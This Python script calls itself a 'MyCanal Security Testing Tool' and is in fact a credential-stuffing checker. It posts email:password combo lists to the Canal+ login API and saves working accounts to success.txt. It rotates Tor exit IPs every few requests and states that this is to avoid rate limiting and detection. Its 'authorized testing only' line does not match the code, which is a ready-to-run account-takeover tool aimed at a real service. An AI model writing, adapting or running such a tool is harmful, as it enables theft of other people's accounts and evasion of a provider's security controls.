#!/usr/bin/env python3
"""
MyCanal Security Testing Tool - TOR POWERED
Uses TOR network to rotate IPs automatically
No need for proxy lists - TOR handles everything!
For authorized security testing only
"""

import requests
from threading import Thread, Lock
from time import sleep, time
import random
import os
from datetime import datetime
import subprocess
import platform

# ============= CONFIGURATION =============
MODE = "mobile"  # "mobile" or "pc"

MOBILE_CONFIG = {
    'threads': 2,
    'delay_min': 3.0,
    'delay_max': 5.0,
    'tor_rotation_interval': 5,  # Change IP every 5 requests
    'timeout': 20
}

PC_CONFIG = {
    'threads': 5,
    'delay_min': 1.5,
    'delay_max': 3.0,
    'tor_rotation_interval': 3,  # Change IP every 3 requests
    'timeout': 15
}

COMBO_FILE = "combo.txt"
SHOW_BAD_RESULTS = False
TOR_ENABLED = True  # Set False to disable TOR and test direct
# ==========================================

CONFIG = MOBILE_CONFIG if MODE == "mobile" else PC_CONFIG

class Statistics:
    def __init__(self):
        self.lock = Lock()
        self.tested = 0
        self.good = 0
        self.bad = 0
        self.errors = 0
        self.tor_rotations = 0
        self.start_time = time()
        
    def update(self, result_type):
        with self.lock:
            self.tested += 1
            if result_type == "GOOD":
                self.good += 1
            elif result_type == "BAD":
                self.bad += 1
            else:
                self.errors += 1
    
    def increment_rotations(self):
        with self.lock:
            self.tor_rotations += 1
    
    def get_stats(self):
        with self.lock:
            elapsed = time() - self.start_time
            rate = self.tested / elapsed if elapsed > 0 else 0
            return {
                'tested': self.tested,
                'good': self.good,
                'bad': self.bad,
                'errors': self.errors,
                'tor_rotations': self.tor_rotations,
                'rate': rate,
                'elapsed': elapsed
            }
    
    def print_stats(self):
        stats = self.get_stats()
        print(f"\n{'='*60}")
        print(f"📊 STATISTICS")
        print(f"{'='*60}")
        print(f"✅ Good: {stats['good']} | ❌ Bad: {stats['bad']} | ⚠️ Errors: {stats['errors']}")
        print(f"🔄 TOR IP Changes: {stats['tor_rotations']}")
        print(f"📈 Total: {stats['tested']} | ⚡ {stats['rate']:.2f}/sec | ⏱️ {int(stats['elapsed'])}s")
        print(f"{'='*60}")

class TorManager:
    def __init__(self):
        self.session = requests.Session()
        self.tor_port = 9050  # Default TOR SOCKS port
        self.control_port = 9051  # TOR control port
        self.tor_password = None
        self.rotation_lock = Lock()
        
    def check_tor_installed(self):
        """Check if TOR is installed"""
        try:
            if platform.system() == "Windows":
                result = subprocess.run(['where', 'tor'], capture_output=True, text=True)
            else:
                result = subprocess.run(['which', 'tor'], capture_output=True, text=True)
            
            return result.returncode == 0
        except:
            return False
    
    def install_tor_instructions(self):
        """Print TOR installation instructions"""
        system = platform.system()
        
        print(f"\n{'='*60}")
        print("🔧 TOR NOT INSTALLED - INSTALLATION GUIDE")
        print(f"{'='*60}\n")
        
        if system == "Linux":
            print("📦 For Ubuntu/Debian:")
            print("   sudo apt update")
            print("   sudo apt install tor -y")
            print("   sudo systemctl start tor")
            print("   sudo systemctl enable tor\n")
            
            print("📦 For Fedora/RHEL:")
            print("   sudo dnf install tor -y")
            print("   sudo systemctl start tor\n")
            
        elif system == "Darwin":  # macOS
            print("📦 For macOS (using Homebrew):")
            print("   brew install tor")
            print("   brew services start tor\n")
            
        elif system == "Windows":
            print("📦 For Windows:")
            print("   1. Download TOR Expert Bundle:")
            print("      https://www.torproject.org/download/tor/")
            print("   2. Extract and run tor.exe")
            print("   3. Or install TOR Browser Bundle\n")
        
        print("🔧 After installation, configure TOR:")
        print("   1. Edit torrc file:")
        if system == "Linux":
            print("      sudo nano /etc/tor/torrc")
        elif system == "Windows":
            print("      Edit: tor-folder/torrc")
        
        print("\n   2. Add these lines:")
        print("      ControlPort 9051")
        print("      HashedControlPassword (leave blank for now)")
        print("      SocksPort 9050")
        
        print("\n   3. Restart TOR:")
        if system == "Linux":
            print("      sudo systemctl restart tor")
        elif system == "Windows":
            print("      Restart tor.exe")
        
        print(f"\n{'='*60}")
        print("📱 MOBILE/iOS USERS:")
        print("   - iOS doesn't support TOR natively")
        print("   - Use Onion Browser from App Store")
        print("   - Then run this script from a PC/VPS")
        print(f"{'='*60}\n")
    
    def get_tor_session(self):
        """Get requests session configured for TOR"""
        session = requests.Session()
        session.proxies = {
            'http': f'socks5h://127.0.0.1:{self.tor_port}',
            'https': f'socks5h://127.0.0.1:{self.tor_port}'
        }
        return session
    
    def check_tor_connection(self):
        """Check if TOR is working"""
        try:
            session = self.get_tor_session()
            response = session.get('https://check.torproject.org/api/ip', timeout=10)
            data = response.json()
            
            if data.get('IsTor'):
                print(f"✅ TOR Connected!")
                print(f"🌍 Your TOR IP: {data.get('IP')}\n")
                return True
            else:
                print(f"❌ Connected but not through TOR")
                print(f"🌍 Your IP: {data.get('IP')}")
                return False
        except Exception as e:
            print(f"❌ TOR Connection Failed: {str(e)}")
            return False
    
    def renew_tor_ip(self):
        """Request new TOR identity (new IP)"""
        with self.rotation_lock:
            try:
                # Method 1: Using telnet to control port
                import socket
                import telnetlib
                
                tn = telnetlib.Telnet('127.0.0.1', self.control_port, timeout=5)
                
                if self.tor_password:
                    tn.write(f'AUTHENTICATE "{self.tor_password}"\r\n'.encode())
                else:
                    tn.write(b'AUTHENTICATE\r\n')
                
                tn.read_until(b"250", timeout=5)
                tn.write(b'SIGNAL NEWNYM\r\n')
                tn.read_until(b"250", timeout=5)
                tn.write(b'QUIT\r\n')
                tn.close()
                
                sleep(3)  # Wait for new circuit
                return True
                
            except Exception as e:
                # Method 2: Restart TOR service (slower)
                try:
                    if platform.system() == "Linux":
                        subprocess.run(['sudo', 'systemctl', 'reload', 'tor'], 
                                     capture_output=True, timeout=5)
                        sleep(5)
                        return True
                except:
                    pass
                
                return False
    
    def get_current_ip(self):
        """Get current IP through TOR"""
        try:
            session = self.get_tor_session()
            response = session.get('https://api.ipify.org?format=json', timeout=10)
            return response.json().get('ip', 'Unknown')
        except:
            return 'Unknown'

class ComboManager:
    def __init__(self, combo_file):
        self.combo_file = combo_file
        self.combos = []
        self.combo_lock = Lock()
        self.current_index = 0
        
    def load_combos(self):
        if not os.path.exists(self.combo_file):
            print(f"❌ '{self.combo_file}' not found!")
            print(f"\n📝 Create it with this format:")
            print(f"   email1@example.com:password1")
            print(f"   email2@example.com:password2\n")
            return False
            
        try:
            with open(self.combo_file, 'r', encoding='utf-8', errors='ignore') as f:
                all_lines = [line.strip() for line in f if line.strip()]
                self.combos = [line for line in all_lines if ':' in line]
            
            print(f"✅ Loaded {len(self.combos)} combos\n")
            return len(self.combos) > 0
        except Exception as e:
            print(f"❌ Failed: {e}")
            return False
    
    def get_next_combo(self):
        with self.combo_lock:
            if self.current_index < len(self.combos):
                combo = self.combos[self.current_index]
                self.current_index += 1
                return combo
        return None
    
    def get_progress(self):
        with self.combo_lock:
            return self.current_index, len(self.combos)

class TorTester(Thread):
    def __init__(self, thread_id, tor_manager, combo_manager, stats):
        Thread.__init__(self)
        self.thread_id = thread_id
        self.tor_manager = tor_manager
        self.combo_manager = combo_manager
        self.stats = stats
        self.daemon = True
        self.requests_count = 0
        
    def run(self):
        while True:
            combo = self.combo_manager.get_next_combo()
            if not combo:
                break
                
            try:
                if ':' not in combo:
                    continue
                    
                user, pswd = combo.split(':', 1)
                user = user.strip()
                pswd = pswd.strip()
                
                # Rotate TOR IP periodically
                if self.requests_count >= CONFIG['tor_rotation_interval']:
                    print(f"[Thread {self.thread_id}] 🔄 Rotating TOR IP...")
                    if self.tor_manager.renew_tor_ip():
                        self.stats.increment_rotations()
                        new_ip = self.tor_manager.get_current_ip()
                        print(f"[Thread {self.thread_id}] 🌍 New IP: {new_ip}")
                    self.requests_count = 0
                
                # Test combo
                result = self.test_combo(user, pswd)
                self.stats.update(result)
                self.log_result(user, pswd, result)
                
                self.requests_count += 1
                
                sleep(random.uniform(CONFIG['delay_min'], CONFIG['delay_max']))
                
            except Exception as e:
                print(f"[Thread {self.thread_id}] Error: {str(e)}")
                continue
    
    def test_combo(self, username, password):
        """Test combo through TOR"""
        try:
            if TOR_ENABLED:
                session = self.tor_manager.get_tor_session()
            else:
                session = requests.Session()
            
            url = "https://pass-api.canal-plus.com/services/apipublique/login"
            params = {
                "email": username,
                "password": password,
                "portialId": "vbdTj7eb6aM.",
                "media": "WEBEC",
                "vect": "INTERNET"
            }
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            response = session.post(
                url,
                params=params,
                headers=headers,
                timeout=CONFIG['timeout']
            )
            
            if response.status_code == 200:
                text = response.text
                
                if any(e in text for e in ['"errorCode":7', '"errorCode":5', 
                                           '"errorCode":6', '"errorCode":8']):
                    return "BAD"
                elif '"errorCode":0' in text:
                    return "GOOD"
                else:
                    return "UNKNOWN"
            else:
                return "ERROR"
                
        except requests.exceptions.Timeout:
            return "ERROR"
        except Exception as e:
            return "ERROR"
    
    def log_result(self, username, password, result):
        combo = f"{username}:{password}"
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        if result == "GOOD":
            msg = f"[{timestamp}] 🎉 SUCCESS: {combo}"
            print(f"\n{'='*60}\n{msg}\n{'='*60}\n")
            with open("success.txt", "a") as f:
                f.write(f"{msg}\n")
        elif result == "BAD":
            if SHOW_BAD_RESULTS:
                print(f"[{timestamp}] ❌ BAD: {combo}")
            with open("bad.txt", "a") as f:
                f.write(f"[{timestamp}] {combo}\n")
        else:
            with open("errors.txt", "a") as f:
                f.write(f"[{timestamp}] {result}: {combo}\n")

def main():
    print(f"\n{'='*60}")
    print("🧅 MyCanal Security Testing - TOR POWERED")
    print(f"{'='*60}")
    print(f"🎮 Mode: {MODE.upper()}")
    print(f"⚡ Threads: {CONFIG['threads']}")
    print(f"🔄 IP Rotation: Every {CONFIG['tor_rotation_interval']} requests")
    print(f"🧅 TOR: {'Enabled' if TOR_ENABLED else 'Disabled (Direct)'}")
    print(f"{'='*60}\n")
    
    # Initialize managers
    tor_manager = TorManager()
    combo_manager = ComboManager(COMBO_FILE)
    stats = Statistics()
    
    # Check TOR installation
    if TOR_ENABLED:
        print("🔍 Checking TOR installation...\n")
        
        if not tor_manager.check_tor_installed():
            tor_manager.install_tor_instructions()
            print("\n⚠️ Please install TOR first, then run this script again.")
            print("💡 Or set TOR_ENABLED = False to test without TOR\n")
            return
        
        print("✅ TOR is installed!\n")
        print("🔌 Testing TOR connection...\n")
        
        if not tor_manager.check_tor_connection():
            print("\n❌ TOR is not running or misconfigured")
            print("\n🔧 Quick Fix:")
            if platform.system() == "Linux":
                print("   sudo systemctl start tor")
                print("   sudo systemctl status tor")
            elif platform.system() == "Windows":
                print("   Run tor.exe from TOR folder")
            print("\n💡 Or set TOR_ENABLED = False to test without TOR\n")
            return
    
    # Load combos
    if not combo_manager.load_combos():
        return
    
    print(f"🚀 Starting {CONFIG['threads']} threads...\n")
    
    if TOR_ENABLED:
        print("💡 TIP: Each thread will rotate its IP automatically")
        print("   This prevents rate limiting and detection!\n")
    
    # Create threads
    threads = []
    for i in range(CONFIG['threads']):
        thread = TorTester(i+1, tor_manager, combo_manager, stats)
        threads.append(thread)
        thread.start()
        sleep(0.5)
    
    # Monitor
    try:
        last_tested = 0
        while any(t.is_alive() for t in threads):
            sleep(10)
            current, total = combo_manager.get_progress()
            current_stats = stats.get_stats()
            
            if current_stats['tested'] > last_tested:
                progress = (current / total * 100) if total > 0 else 0
                print(f"\n>>> Progress: {current}/{total} ({progress:.1f}%)")
                stats.print_stats()
                last_tested = current_stats['tested']
    
    except KeyboardInterrupt:
        print("\n⚠️ Stopped by user")
    
    # Wait for threads
    for thread in threads:
        thread.join(timeout=5)
    
    # Final stats
    print("\n" + "="*60)
    print("✅ TESTING COMPLETED")
    print("="*60)
    stats.print_stats()
    print("\n📁 Results saved to:")
    print("   success.txt | bad.txt | errors.txt")
    print("="*60 + "\n")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"\n❌ Fatal Error: {e}")
        import traceback
        traceback.print_exc()